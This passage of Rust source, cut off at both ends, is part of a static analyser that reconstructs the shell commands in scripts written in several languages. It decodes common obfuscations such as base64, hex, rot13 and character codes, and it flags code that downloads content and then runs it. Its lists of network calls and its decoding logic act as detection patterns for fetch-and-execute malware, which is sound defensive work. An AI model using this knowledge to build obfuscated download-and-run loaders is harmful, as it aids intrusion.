                        js_option(arguments, key).map(|v| self.fold(option_value(v), FOLD_DEPTH))
                    };
                    let mut words = vec![option("file").unwrap_or(Value::Unknown)];
                    if let Some(Value::List(items)) = option("args") {
                        words.extend(items.into_iter().skip(1));
                    }
                    self.read_words(done, words);
                }
            }
        }
    }

    /// `eval` handed on as a function (`.then(eval)`) after a download.
    fn scan_eval_handed_on(&mut self, start: usize, end: usize) {
        let code = self.code;
        let bytes = code.as_bytes();
        for (offset, _) in code[start..end].match_indices("eval") {
            let at = start + offset;
            let whole = (at == 0 || !is_name_byte(bytes[at - 1]))
                && !bytes.get(at + 4).is_some_and(|b| is_name_byte(*b));
            let handed_on = code[..at].trim_end().ends_with(['(', ','])
                && code[at + 4..end].trim_start().starts_with([')', ',']);
            if whole && handed_on && self.fetch_before(at) {
                self.out.runs_download = true;
            }
        }
    }

    /// Ruby's, Perl's and PHP's backticks, Ruby's `%x`, Perl's `qx`.
    fn scan_command_quotes(&mut self, start: usize, end: usize) {
        let code = self.code;
        let bytes = code.as_bytes();
        let mut at = start;
        while at < end {
            let rest = &code[at..end];
            let boundary = at == 0 || !is_name_byte(bytes[at - 1]);
            let opener = if rest.starts_with('\u{60}') {
                Some(0)
            } else if boundary
                && ((self.lang == Lang::Ruby && rest.starts_with("%x"))
                    || (self.lang == Lang::Perl && rest.starts_with("qx")))
            {
                Some(2)
            } else {
                None
            };
            if let Some(skip) = opener {
                if let Some((value, after)) = self.command_quote(&rest[skip..]) {
                    let done = end - after.len();
                    self.read_line(done, value);
                    at = done;
                    continue;
                }
            } else if matches!(bytes[at], b'\'' | b'"' | b'#') {
                if let Some(skip) = self.skip_literal(at, end) {
                    at = skip.max(at + 1);
                    continue;
                }
            }
            at += rest.chars().next().map_or(1, char::len_utf8);
        }
    }

    /// A command quote at the start of `text`: its delimiter, then the
    /// line, read as a double-quoted string is.
    fn command_quote<'t>(&self, text: &'t str) -> Option<(Value, &'t str)> {
        let open = text.chars().next()?;
        let close = match open {
            '{' => '}',
            '(' => ')',
            '[' => ']',
            '<' => '>',
            c if c.is_ascii_punctuation() => c,
            _ => return None,
        };
        let body = &text[open.len_utf8()..];
        let end = body.find(close)?;
        let value = self.interpolated(&body[..end]);
        Some((value, &body[end + close.len_utf8()..]))
    }

    fn positional_value(&self, positional: &[&str], index: usize) -> Value {
        positional
            .get(index)
            .map_or(Value::Unknown, |part| self.fold(part, FOLD_DEPTH))
    }

    fn positional_vector(&self, positional: &[&str], index: usize) -> Vec<Value> {
        match self.positional_value(positional, index) {
            Value::List(items) => items,
            other => vec![other],
        }
    }

    fn read_sink(&mut self, sink: Sink, done: usize, arguments: &str) {
        let mut positional: Vec<&str> = Vec::new();
        let mut keywords: Vec<(&str, &str)> = Vec::new();
        for part in split_top(arguments, ",") {
            let trimmed = part.trim();
            if trimmed.is_empty() {
                continue;
            }
            match keyword_argument(self.lang, trimmed) {
                Some(pair) => keywords.push(pair),
                None => positional.push(trimmed),
            }
        }
        match sink {
            Sink::Line => match self.positional_value(&positional, 0) {
                Value::List(items) => self.read_words(done, items),
                other => self.read_line(done, other),
            },
            Sink::Subprocess => {
                let shell = keywords.iter().any(|(name, value)| {
                    *name == "shell" && !matches!(value.trim(), "False" | "0" | "None")
                });
                match self.positional_value(&positional, 0) {
                    Value::List(items) if shell => {
                        let line = items.first().cloned().unwrap_or(Value::Unknown);
                        self.read_line(done, line);
                    }
                    Value::List(items) => self.read_words(done, items),
                    first if shell => self.read_line(done, first),
                    other => self.read_words(done, vec![other]),
                }
            }
            Sink::LineOrWords => {
                // An environment first (Ruby's `{ "A" => "b" }`) and options
                // last (`chdir: "/"`) are not the command.
                let values: Vec<Value> = positional
                    .iter()
                    .filter(|part| !part.starts_with('{') && !ruby_option(part))
                    .map(|part| self.fold(part, FOLD_DEPTH))
                    .collect();
                match values.as_slice() {
                    [] => {}
                    [Value::List(items)] => self.read_words(done, items.clone()),
                    [one] => self.read_line(done, one.clone()),
                    _ => self.read_words(done, values),
                }
            }
            Sink::Words => {
                let words = (0..positional.len())
                    .map(|index| self.positional_value(&positional, index))
                    .collect();
                self.read_words(done, words);
            }
            Sink::PathVector | Sink::ModePathVector | Sink::PathList => {
                let first = usize::from(sink == Sink::ModePathVector);
                let mut words = vec![self.positional_value(&positional, first)];
                let rest = self.positional_vector(&positional, first + 1);
                let skip = usize::from(sink != Sink::PathList);
                words.extend(rest.into_iter().skip(skip));
                self.read_words(done, words);
            }
            Sink::PathWords | Sink::ModePathWords => {
                let first = usize::from(sink == Sink::ModePathWords);
                let mut words = vec![self.positional_value(&positional, first)];
                for index in first + 2..positional.len() {
                    words.push(self.positional_value(&positional, index));
                }
                self.read_words(done, words);
            }
            Sink::DenoCommand => {
                let mut words = vec![self.positional_value(&positional, 0)];
                if let Some(options) = positional.get(1) {
                    match js_option(options, "args").map(|v| self.fold(option_value(v), FOLD_DEPTH))
                    {
                        Some(Value::List(items)) => words.extend(items),
                        Some(other) => words.push(other),
                        None => {}
                    }
                }
                self.read_words(done, words);
            }
            Sink::DenoRun => {
                let options = positional.first().copied().unwrap_or("");
                let words = match js_option(options, "cmd")
                    .map(|v| self.fold(option_value(v), FOLD_DEPTH))
                {
                    Some(Value::List(items)) => items,
                    Some(other) => vec![other],
                    None => vec![Value::Unknown],
                };
                self.read_words(done, words);
            }
            Sink::Code => {
                let Some(first) = positional.first() else {
                    return;
                };
                if let Some(path) = opened_file(first) {
                    self.read_load(Value::Str(path));
                    return;
                }
                match self.fold(first, FOLD_DEPTH) {
                    Value::Str(code) if !code.contains(UNREAD) => {
                        let inner = read_code(self.lang, &code, self.depth - 1);
                        self.out.merge(inner);
                    }
                    _ => {
                        if self.fetch_before(done) {
                            self.out.runs_download = true;
                        }
                    }
                }
            }
            Sink::Load => {
                let first = self.positional_value(&positional, 0);
                self.read_load(first);
            }
        }
    }

    /// Code loaded from a path or a URL.
    fn read_load(&mut self, value: Value) {
        let Some(path) = value.literal() else {
            return;
        };
        let path = path.trim();
        let lower = path.to_ascii_lowercase();
        if lower.starts_with("data:") {
            if let Some(body) = data_url_body(path) {
                let inner = read_code(self.lang, &body, self.depth - 1);
                self.out.merge(inner);
            }
        } else if ["http://", "https://", "ftp://"]
            .iter()
            .any(|scheme| lower.starts_with(scheme))
            || self.downloaded.iter().any(|saved| same_path(saved, path))
        {
            self.out.runs_download = true;
        }
    }

    /// A line handed to a shell.
    fn read_line(&mut self, done: usize, value: Value) {
        let text = match value {
            Value::Str(text) => text,
            Value::Num(number) => number.to_string(),
            Value::List(items) => {
                self.read_words(done, items);
                return;
            }
            Value::Unknown => UNREAD.to_string(),
        };
        if text.trim_start().starts_with(UNREAD) || text.trim().is_empty() {
            self.out.unread = true;
        }
        if text.contains(UNREAD) && self.fetch_before(done) {
            self.out.runs_download = true;
        }
        let line = text.replace(UNREAD, UNREAD_WORD);
        if line.trim() != UNREAD_WORD {
            self.note_line(done, &line);
            self.out.lines.push(line);
        }
    }

    /// A program and its arguments.
    fn read_words(&mut self, done: usize, words: Vec<Value>) {
        let mut flat = Vec::new();
        for word in words {
            match word {
                Value::List(items) => flat.extend(items),
                other => flat.push(other),
            }
        }
        let Some(program) = flat.first() else {
            return;
        };
        let readable =
            matches!(program, Value::Str(text) if !text.trim_start().starts_with(UNREAD));
        if !readable {
            self.out.unread = true;
        }
        if flat.iter().any(Value::has_unread) && self.fetch_before(done) {
            self.out.runs_download = true;
        }
        if !readable {
            return;
        }
        let literal: Vec<String> = flat.iter().map(Value::text).collect();
        if runs_its_input(&literal) && self.fetch_before(done) {
            self.out.runs_download = true;
        }
        let line = flat.iter().map(rendered_word).collect::<Vec<_>>().join(" ");
        self.note_line(done, &line);
        self.out.lines.push(line);
    }

    /// A line that downloads is a download, and the files it writes are
    /// downloaded; a line that names a downloaded file runs a download.
    fn note_line(&mut self, done: usize, line: &str) {
        let names_a_download = line.split_whitespace().any(|word| {
            let word = word.trim_matches(['\'', '"']);
            self.downloaded.iter().any(|saved| same_path(word, saved))
        });
        if names_a_download {
            self.out.runs_download = true;
        }
        if line_downloads(line) {
            if !self.fetches.contains(&done) {
                self.fetches.push(done);
            }
            self.downloaded.extend(download_outputs(line));
        }
    }

    /// Where the code downloads; the files it writes a download to are
    /// kept as downloaded.
    fn fetch_positions(&mut self) -> Vec<usize> {
        let code = self.code;
        let mut positions = Vec::new();
        for (start, end) in statements(code) {
            let sites: Vec<(String, usize, &str)> = self
                .call_sites(start, end)
                .into_iter()
                .map(|(chain, at, arguments_at)| {
                    (
                        self.callee(&chain),
                        at,
                        call_arguments(&code[arguments_at..end]),
                    )
                })
                .collect();
            let fetches = |callee: &str, arguments: &str| {
                network_callee(self.lang, callee) || reads_a_url(callee, arguments)
            };
            let statement_fetches = sites
                .iter()
                .any(|(callee, _, arguments)| fetches(callee, arguments));
            for (callee, at, arguments) in &sites {
                if fetches(callee, arguments) {
                    positions.push(*at);
                }
                let last = callee
                    .rsplit(['.', ':', '>'])
                    .next()
                    .unwrap_or(callee)
                    .to_ascii_lowercase();
                let saves = matches!(last.as_str(), "urlretrieve" | "getstore")
                    || (statement_fetches
                        && ["write", "put_contents", "copy_stream", "save", "download"]
                            .iter()
                            .any(|word| last.contains(word)));
                if saves {
                    for part in split_top(arguments, ",") {
                        if let Some(path) = self.fold(part, 4).literal() {
                            if looks_like_path(path) {
                                self.downloaded.push(path.to_owned());
                            }
                        }
                    }
                }
            }
            // Node's `require("https").get(...)`.
            if self.lang == Lang::Js {
                let statement = &code[start..end];
                for module in ["http", "https", "node:http", "node:https"] {
                    for quote in ['\'', '"'] {
                        let opener = format!("require({quote}{module}{quote})");
                        for (offset, _) in statement.match_indices(&opener) {
                            let after = &statement[offset + opener.len()..];
                            if after.starts_with(".get(") || after.starts_with(".request(") {
                                positions.push(start + offset);
                            }
                        }
                    }
                }
            }
        }
        positions.sort_unstable();
        positions
    }

    /// The values names are set to in a statement: `name = value`, after
    /// the declarations of each language, and `+=` or `.=`.
    fn assign(&mut self, statement: &str) {
        let mut text = statement.trim();
        for keyword in ["const ", "let ", "var ", "my ", "our ", "local "] {
            if let Some(rest) = text.strip_prefix(keyword) {
                text = rest.trim_start();
            }
        }
        let bytes = text.as_bytes();
        let mut end = 0;
        if matches!(bytes.first(), Some(b'$' | b'@')) && matches!(self.lang, Lang::Perl | Lang::Php)
        {
            end = 1;
        }
        while end < bytes.len()
            && (bytes[end].is_ascii_alphanumeric()
                || bytes[end] == b'_'
                || (bytes[end] == b'$' && self.lang == Lang::Js))
        {
            end += 1;
        }
        if end == 0 || bytes[0].is_ascii_digit() {
            return;
        }
        let name = &text[..end];
        let rest = text[end..].trim_start();
        let (append, expression) =
            if let Some(expression) = rest.strip_prefix("+=").or_else(|| rest.strip_prefix(".=")) {
                (true, expression)
            } else if let Some(expression) = rest.strip_prefix('=') {
                if expression.starts_with(['=', '~', '>']) {
                    return;
                }
                (false, expression)
            } else {
                return;
            };
        let expression = expression.trim();
        // A name given a function or a module: `s = os.system`.
        if self.lang == Lang::Python && !append && is_chain(expression) {
            let callee = self.callee(expression);
            if sink_of(self.lang, &callee).is_some() || network_callee(self.lang, &callee) {
                self.aliases.insert(name.to_owned(), callee);
                return;
            }
        }
        let mut value = self.fold(expression, FOLD_DEPTH);
        if append {
            let before = self.vars.get(name).cloned().unwrap_or(Value::Unknown);
            value = match (before, value) {
                (Value::List(mut first), Value::List(second)) => {
                    first.extend(second);
                    Value::List(first)
                }
                (first, second) => capped(first.text() + &second.text()),
            };
        }
        self.vars.insert(name.to_owned(), value);
    }

    /// The value an expression builds, when the reader can say.
    fn fold(&self, expression: &str, depth: u8) -> Value {
        let text = expression.trim();
        if depth == 0 || text.is_empty() {
            return Value::Unknown;
        }
        let parts: Vec<&str> = match self.lang {
            Lang::Php | Lang::Perl => split_top_by(text, |rest| {
                (rest.starts_with('.')
                    && !rest.starts_with("..")
                    && !rest.starts_with(".=")
                    && !rest[1..].starts_with(|c: char| c.is_ascii_digit()))
                .then_some(1)
            }),
            Lang::Lua => split_top(text, ".."),
            _ => split_top_by(text, |rest| {
                (rest.starts_with('+') && !rest.starts_with("++") && !rest.starts_with("+="))
                    .then_some(1)
            }),
        }
        .into_iter()
        .filter(|part| !part.trim().is_empty())
        .collect();
        if parts.len() > 1 {
            let values: Vec<Value> = parts
                .iter()
                .map(|part| self.fold(part, depth - 1))
                .collect();
            if matches!(self.lang, Lang::Python | Lang::Ruby)
                && values.iter().all(|value| matches!(value, Value::List(_)))
            {
                let mut items = Vec::new();
                for value in values {
                    if let Value::List(list) = value {
                        items.extend(list);
                    }
                }
                return Value::List(items);
            }
            if values.iter().all(|value| matches!(value, Value::Num(_))) {
                return Value::Unknown;
            }
            return capped(values.iter().map(Value::text).collect());
        }
        // Python's and Ruby's `"..." % values`.
        if matches!(self.lang, Lang::Python | Lang::Ruby) {
            let pieces = split_top(text, " % ");
            if pieces.len() == 2 {
                if let Value::Str(format) = self.fold(pieces[0], depth - 1) {
                    let values = match self.fold(pieces[1], depth - 1) {
                        Value::List(items) => items,
                        other => vec![other],
                    };
                    return capped(percent_format(&format, &values));
                }
            }
        }
        self.fold_term(text, depth)
    }

    fn fold_term(&self, text: &str, depth: u8) -> Value {
        let Some((mut value, mut rest)) = self.primary(text, depth) else {
            return Value::Unknown;
        };
        for _ in 0..32 {
            let trimmed = rest.trim_start();
            if trimmed.is_empty() {
                return value;
            }
            let Some((next, after)) = self.postfix(value, trimmed, depth) else {
                return Value::Unknown;
            };
            value = next;
            rest = after;
        }
        Value::Unknown
    }

    /// The value at the start of `text`, and what follows it.
    fn primary<'t>(&self, text: &'t str, depth: u8) -> Option<(Value, &'t str)> {
        let first = text.chars().next()?;
        if let Some(found) = self.string_at(text, Some(depth)) {
            return Some(found);
        }
        if first == '{' && self.lang == Lang::Lua {
            let close = closing(&text[1..])?;
            let items = split_top(&text[1..1 + close], ",")
                .into_iter()
                .filter(|item| !item.trim().is_empty())
                .map(|item| self.fold(item, depth - 1))
                .collect();
            return Some((Value::List(items), &text[2 + close..]));
        }
        if first == '(' || first == '[' {
            let close = closing(&text[1..])?;
            let inner = &text[1..1 + close];
            let after = &text[2 + close..];
            if first == '[' && inner.contains(" for ") {
                return Some((Value::Unknown, after));
            }
            let items: Vec<&str> = split_top(inner, ",")
                .into_iter()
                .filter(|item| !item.trim().is_empty())
                .collect();
            let list = first == '[' || items.len() > 1 || inner.trim_end().ends_with(',');
            let value = if list {
                Value::List(
                    items
                        .iter()
                        .map(|item| self.fold(item, depth - 1))
                        .collect(),
                )
            } else {
                self.fold(inner, depth - 1)
            };
            return Some((value, after));
        }
        let quoted_words = matches!(
            (self.lang, text.get(..2)),
            (Lang::Ruby, Some("%w")) | (Lang::Perl, Some("qw"))
        );
        if quoted_words {
            let rest = &text[2..];
            let open = rest.chars().next()?;
            let close = match open {
                '(' => ')',
                '[' => ']',
                '{' => '}',
                '<' => '>',
                other => other,
            };
            let body = &rest[open.len_utf8()..];
            let end = body.find(close)?;
            let items = body[..end]
                .split_whitespace()
                .map(|word| Value::Str(word.to_owned()))
                .collect();
            return Some((Value::List(items), &body[end + close.len_utf8()..]));
        }
        if first.is_ascii_digit()
            || (first == '-' && text[1..].starts_with(|c: char| c.is_ascii_digit()))
        {
            let end = text[1..]
                .find(|c: char| !c.is_ascii_alphanumeric())
                .map_or(text.len(), |end| end + 1);
            let digits = &text[..end];
            let number = match digits
                .strip_prefix("0x")
                .or_else(|| digits.strip_prefix("0X"))
            {
                Some(hex) => i64::from_str_radix(hex, 16).ok(),
                None => digits.parse().ok(),
            };
            return Some((number.map_or(Value::Unknown, Value::Num), &text[end..]));
        }
        if !(first.is_ascii_alphabetic() || matches!(first, '_' | '$' | '@')) {
            return None;
        }
        let start = if text.starts_with("new ") { 4 } else { 0 };
        let bytes = text.as_bytes();
        let mut end = start;
        if matches!(bytes.get(end), Some(b'$' | b'@')) {
            end += 1;
            if bytes.get(end) == Some(&b'^') {
                end = (end + 2).min(bytes.len());
            }
        }
        loop {
            while end < bytes.len() && is_name_byte(bytes[end]) {
                end += 1;
            }
            let rest = &text[end..];
            let separator = if rest.starts_with("::") {
                2
            } else if rest.starts_with('.') && !matches!(self.lang, Lang::Php | Lang::Perl) {
                1
            } else {
                0
            };
            if separator == 0
                || !rest[separator..].starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
            {
                break;
            }
            end += separator;
        }
        let chain = &text[start..end];
        let rest = &text[end..];
        if let Some(arguments) = rest.trim_start().strip_prefix('(') {
            let close = closing(arguments)?;
            let inner = &arguments[..close];
            let after = &arguments[close + 1..];
            if let Some(value) = self.call_value(chain, inner, depth) {
                return Some((value, after));
            }
            // `receiver.method(...)`: the receiver, then the method.
            if let Some((receiver, method)) = chain.rsplit_once('.') {
                if let Some(value) = self.lookup(receiver) {
                    return Some((self.method(value, method, Some(inner), depth), after));
                }
            }
            return Some((Value::Unknown, after));
        }
        if let Some(value) = self.lookup(chain) {
            return Some((value, rest));
        }
        if let Some((receiver, method)) = chain.rsplit_once('.') {
            if let Some(value) = self.lookup(receiver) {
                return Some((self.method(value, method, None, depth), rest));
            }
        }
        Some((Value::Unknown, rest))
    }

    /// A method, an index or a slice after a value.
    fn postfix<'t>(&self, value: Value, text: &'t str, depth: u8) -> Option<(Value, &'t str)> {
        if let Some(rest) = text.strip_prefix('.').or_else(|| text.strip_prefix("->")) {
            let end = rest
                .bytes()
                .position(|b| !is_name_byte(b))
                .unwrap_or(rest.len());
            if end == 0 {
                return None;
            }
            let method = &rest[..end];
            if let Some(arguments) = rest[end..].trim_start().strip_prefix('(') {
                let close = closing(arguments)?;
                let value = self.method(value, method, Some(&arguments[..close]), depth);
                return Some((value, &arguments[close + 1..]));
            }
            return Some((self.method(value, method, None, depth), &rest[end..]));
        }
        let inner = text.strip_prefix('[')?;
        let close = closing(inner)?;
        let index = inner[..close].trim();
        let after = &inner[close + 1..];
        let value = match (value, index) {
            (Value::Str(text), "::-1") => Value::Str(text.chars().rev().collect()),
            (Value::List(items), "::-1") => Value::List(items.into_iter().rev().collect()),
            (Value::List(items), index) => match self.fold(index, depth - 1) {
                Value::Num(number) => usize::try_from(number)
                    .ok()
                    .and_then(|number| items.get(number).cloned())
                    .unwrap_or(Value::Unknown),
                _ => Value::Unknown,
            },
            _ => Value::Unknown,
        };
        Some((value, after))
    }

    fn arguments(&self, inner: &str, depth: u8) -> Vec<Value> {
        split_top(inner, ",")
            .iter()
            .filter(|part| !part.trim().is_empty())
            .map(|part| self.fold(part, depth - 1))
            .collect()
    }

    /// What a function the reader knows returns.
    fn call_value(&self, chain: &str, inner: &str, depth: u8) -> Option<Value> {
        let callee = self.callee(chain);
        let args = || self.arguments(inner, depth);
        let first = || args().into_iter().next().unwrap_or(Value::Unknown);
        let decoded = |value: &Value, decode: fn(&str) -> Option<String>| match value.literal() {
            Some(text) => decode(text).map_or(Value::Unknown, capped),
            None => Value::Unknown,
        };
        Some(match callee.as_str() {
            "base64.b64decode"
            | "base64.standard_b64decode"
            | "base64.urlsafe_b64decode"
            | "base64.decodebytes"
            | "base64.decodestring"
            | "b64decode"
            | "atob"
            | "Base64.decode64"
            | "Base64.strict_decode64"
            | "Base64.urlsafe_decode64"
            | "decode_base64"
            | "MIME::Base64::decode_base64"
            | "MIME::Base64::decode"
            | "base64_decode" => decoded(&first(), base64_text),
            "bytes.fromhex" | "binascii.unhexlify" | "binascii.a2b_hex" | "hex2bin" => {
                decoded(&first(), hex_text)
            }
            "codecs.decode" => {
                let values = args();
                let source = values.first().cloned().unwrap_or(Value::Unknown);
                match values.get(1).and_then(Value::literal) {
                    Some("hex") => decoded(&source, hex_text),
                    Some("base64") => decoded(&source, base64_text),
                    Some("rot13" | "rot_13") => source
                        .literal()
                        .map_or(Value::Unknown, |text| Value::Str(rot13(text))),
                    _ => Value::Unknown,
                }
            }
            "Buffer.from" => {
                let values = args();
                let source = values.first().cloned().unwrap_or(Value::Unknown);
                match values.get(1).and_then(Value::literal) {
                    Some("base64" | "base64url") => decoded(&source, base64_text),
                    Some("hex") => decoded(&source, hex_text),
                    _ => match source {
                        Value::List(items) => chars_of(&items),
                        other => other,
                    },
                }
            }
            "chr" | "string.char" | "String.fromCharCode" | "String.fromCodePoint" => {
                chars_of(&args())
            }
            "bytes" | "bytearray" => match first() {
                Value::List(items) => chars_of(&items),
                other => other,
            },
            "str" | "String" | "strval" | "tostring" => first(),
            "decodeURIComponent"
            | "decodeURI"
            | "unescape"
            | "urllib.parse.unquote"
            | "urldecode"
            | "rawurldecode"
            | "URI.decode_www_form_component"
            | "CGI.unescape" => first()
                .literal()
                .map_or(Value::Unknown, |text| capped(percent_decoded(text))),
            "strrev" => first().literal().map_or(Value::Unknown, |text| {
                Value::Str(text.chars().rev().collect())
            }),
            "reversed" => match first() {
                Value::List(items) => Value::List(items.into_iter().rev().collect()),
                Value::Str(text) => Value::List(
                    text.chars()
                        .rev()
                        .map(|c| Value::Str(c.to_string()))
                        .collect(),
                ),
                _ => Value::Unknown,
            },
            "list" => match first() {
                Value::Str(text) => {
                    Value::List(text.chars().map(|c| Value::Str(c.to_string())).collect())
                }
                other => other,
            },
            "map" => {
                let parts = split_top(inner, ",");
                let function = parts.first().map_or("", |function| function.trim());
                let list = parts
                    .get(1)
                    .map_or(Value::Unknown, |list| self.fold(list, depth - 1));
                match (function, list) {
                    ("chr", Value::List(items)) => Value::List(
                        items
                            .iter()
                            .map(|item| chars_of(std::slice::from_ref(item)))
                            .collect(),
                    ),
                    ("str", Value::List(items)) => {
                        Value::List(items.iter().map(|item| Value::Str(item.text())).collect())
                    }
                    _ => Value::Unknown,
                }
            }
            "join" if self.lang == Lang::Perl => {
                let values = args();
                let Some((separator, items)) = values.split_first() else {
                    return Some(Value::Unknown);
                };
                let mut flat = Vec::new();
                for item in items {
                    match item {
                        Value::List(list) => flat.extend(list.iter().cloned()),
                        other => flat.push(other.clone()),
                    }
                }
                capped(
                    flat.iter()
                        .map(Value::text)
                        .collect::<Vec<_>>()
                        .join(&separator.text()),
                )
            }
            "implode" | "join" if self.lang == Lang::Php => {
                let (separator, list) = match args().as_slice() {
                    [Value::List(list)] => (String::new(), list.clone()),
                    [separator, Value::List(list)] | [Value::List(list), separator] => {
                        (separator.text(), list.clone())
                    }
                    _ => return Some(Value::Unknown),
                };
                capped(
                    list.iter()
                        .map(Value::text)
                        .collect::<Vec<_>>()
                        .join(&separator),
                )
            }
            "str_replace" => {
                let values = args();
                match (
                    values.first().and_then(Value::literal),
                    values.get(1).and_then(Value::literal),
                    values.get(2),
                ) {
                    (Some(from), Some(to), Some(Value::Str(subject))) if !from.is_empty() => {
                        capped(subject.replace(from, to))
                    }
                    _ => Value::Unknown,
                }
            }
            "strtolower" | "lc" => match first() {
                Value::Str(text) => Value::Str(text.to_lowercase()),
                _ => Value::Unknown,
            },
            "table.concat" => match args().as_slice() {
                [Value::List(list)] => capped(list.iter().map(Value::text).collect()),
                [Value::List(list), separator] => capped(
                    list.iter()
                        .map(Value::text)
                        .collect::<Vec<_>>()
                        .join(&separator.text()),
                ),
                _ => Value::Unknown,
            },
            _ => return None,
        })
    }

    /// What a method of a value the reader knows returns.
    fn method(&self, value: Value, method: &str, inner: Option<&str>, depth: u8) -> Value {
        let args = || {
            inner
                .map(|inner| self.arguments(inner, depth))
                .unwrap_or_default()
        };
        match (value, method) {
            (Value::Str(separator), "join") if self.lang == Lang::Python => {
                let Some(inner) = inner else {
                    return Value::Unknown;
                };
                let items = match generator_over(inner) {
                    Some((function, list)) => match self.fold(list, depth - 1) {
                        Value::List(items) => items
                            .iter()
                            .map(|item| match function {
                                "chr" => chars_of(std::slice::from_ref(item)),
                                _ => Value::Str(item.text()),
                            })
                            .collect(),
                        _ => return Value::Unknown,
                    },
                    None => match self.fold(inner, depth - 1) {
                        Value::List(items) => items,
                        Value::Str(text) => {
                            text.chars().map(|c| Value::Str(c.to_string())).collect()
                        }
                        _ => return Value::Unknown,
                    },
                };
                capped(
                    items
                        .iter()
                        .map(Value::text)
                        .collect::<Vec<_>>()
                        .join(&separator),
                )
            }
            (Value::List(items), "join") => {
                let separator = match args().first() {
                    Some(value) => value.text(),
                    None if self.lang == Lang::Js => ",".to_owned(),
                    None => String::new(),
                };
                capped(
                    items
                        .iter()
                        .map(Value::text)
                        .collect::<Vec<_>>()
                        .join(&separator),
                )
            }
            (Value::List(items), "reverse") => Value::List(items.into_iter().rev().collect()),
            (Value::Str(text), "reverse") => Value::Str(text.chars().rev().collect()),
            (Value::List(items), "pack") => match args().first().and_then(Value::literal) {
                Some("c*" | "C*" | "U*") => chars_of(&items),
                _ => Value::Unknown,
            },
            (Value::List(items), "map") => {
                let inner = inner.unwrap_or("");
                if inner.contains("fromCharCode")
                    || inner.trim() == "&:chr"
                    || inner.contains(".chr")
                {
                    Value::List(
                        items
                            .iter()
                            .map(|item| chars_of(std::slice::from_ref(item)))
                            .collect(),
                    )
                } else {
                    Value::Unknown
                }
            }
            (Value::Num(number), "chr") => chars_of(&[Value::Num(number)]),
            (Value::Str(text), "split") => match args().first() {
                Some(Value::Str(separator)) if separator.is_empty() => {
                    Value::List(text.chars().map(|c| Value::Str(c.to_string())).collect())
                }
                Some(Value::Str(separator)) => Value::List(
                    text.split(separator.as_str())
                        .map(|part| Value::Str(part.to_owned()))
                        .collect(),
                ),
                None if matches!(self.lang, Lang::Python | Lang::Ruby) => Value::List(
                    text.split_whitespace()
                        .map(|part| Value::Str(part.to_owned()))
                        .collect(),
                ),
                _ => Value::Unknown,
            },
            (Value::Str(text), "replace" | "replaceAll" | "gsub" | "sub") => {
                let values = args();
                match (
                    values.first().and_then(Value::literal),
                    values.get(1).and_then(Value::literal),
                ) {
                    (Some(from), Some(to)) if !from.is_empty() => {
                        if (self.lang == Lang::Js && method == "replace") || method == "sub" {
                            capped(text.replacen(from, to, 1))
                        } else {
                            capped(text.replace(from, to))
                        }
                    }
                    _ => Value::Unknown,
                }
            }
            (Value::Str(text), "format") => capped(brace_format(&text, &args())),
            (Value::Str(text), "unpack1" | "unpack") => {
                match args().first().and_then(Value::literal) {
                    Some("m" | "m0") => base64_text(&text).map_or(Value::Unknown, capped),
                    _ => Value::Unknown,
                }
            }
            (Value::Str(text), "lower" | "downcase" | "toLowerCase") => {
                Value::Str(text.to_lowercase())
            }
            (Value::Str(text), "upper" | "upcase" | "toUpperCase") => {
                Value::Str(text.to_uppercase())
            }
            (
                Value::Str(text),
                "strip" | "trim" | "chomp" | "rstrip" | "lstrip" | "trimEnd" | "trimStart",
            ) => Value::Str(text.trim().to_owned()),
            (
                value @ Value::Str(_),
                "decode" | "encode" | "toString" | "to_s" | "to_str" | "valueOf" | "tostring"
                | "freeze" | "dup" | "clone" | "b",
            ) => value,
            _ => Value::Unknown,
        }
    }

    /// The value a name holds, or the name of the interpreter itself.
    fn lookup(&self, name: &str) -> Option<Value> {
        if let Some(value) = self.vars.get(name) {
            return Some(value.clone());
        }
        let interpreter = match (self.lang, name) {
            (Lang::Python, "sys.executable") => "python3",
            (Lang::Js, "process.execPath" | "process.argv0") => "node",
            (Lang::Php, "PHP_BINARY") => "php",
            (Lang::Perl, "$^X") => "perl",
            (Lang::Ruby, "RbConfig.ruby") => "ruby",
            _ => return None,
        };
        Some(Value::Str(interpreter.to_owned()))
    }

    /// A string at the start of `text` in this language and the text after
    /// it, with what it interpolates folded when `depth` is given.
    fn string_at<'t>(&self, text: &'t str, depth: Option<u8>) -> Option<(Value, &'t str)> {
        let bytes = text.as_bytes();
        if self.lang == Lang::Python {
            let prefix = bytes
                .iter()
                .take(3)
                .take_while(|byte| b"rRbBuUfF".contains(byte))
                .count();
            let quote = *bytes.get(prefix)?;
            if !matches!(quote, b'\'' | b'"') || prefix > 2 {
                return None;
            }
            let flags = text[..prefix].to_ascii_lowercase();
            let raw = flags.contains('r');
            let body = &text[prefix..];
            let triple = if quote == b'"' { "\"\"\"" } else { "'''" };
            let (inner, after) = if body.starts_with(triple) {
                let end = body[3..].find(triple)?;
                (&body[3..3 + end], &body[6 + end..])
            } else {
                let end = quoted_end(&body[1..], quote as char, true)?;
                (&body[1..1 + end], &body[2 + end..])
            };
            let mut value = if raw {
                inner.to_owned()
            } else {
                unescaped(inner)
            };
            if let (true, Some(depth)) = (flags.contains('f'), depth) {
                value = self.fill(&value, "{", depth);
            }
            return Some((capped(value), after));
        }
        let quote = *bytes.first()?;
        let template = quote == b'\x60' && self.lang == Lang::Js;
        if !matches!(quote, b'\'' | b'"') && !template {
            return None;
        }
        let escapes = quote != b'\'' || matches!(self.lang, Lang::Js | Lang::Lua);
        let end = quoted_end(&text[1..], quote as char, true)?;
        let inner = &text[1..1 + end];
        let after = &text[2 + end..];
        let interpolating =
            template || (quote == b'"' && matches!(self.lang, Lang::Ruby | Lang::Perl | Lang::Php));
        let value = if !escapes {
            inner.replace("\\'", "'").replace("\\\\", "\\")
        } else {
            match (interpolating, depth) {
                (true, Some(depth)) => match self.lang {
                    Lang::Js => self.fill(&unescaped(inner), "\x24{", depth),
                    Lang::Ruby => self.fill(&unescaped(inner), "#{", depth),
                    _ => self.sigil_fill(&unescaped(inner)),
                },
                _ => unescaped(inner),
            }
        };
        Some((capped(value), after))
    }

    /// A double-quoted string's body with what it interpolates folded.
    fn interpolated(&self, body: &str) -> Value {
        let text = unescaped(body);
        capped(match self.lang {
            Lang::Ruby => self.fill(&text, "#{", FOLD_DEPTH),
            _ => self.sigil_fill(&text),
        })
    }

    /// `text` with each interpolation that starts with `open` and ends at
    /// its closing brace replaced with what its expression folds to.
    fn fill(&self, text: &str, open: &str, depth: u8) -> String {
        let mut out = String::new();
        let mut rest = text;
        while let Some(at) = rest.find(open) {
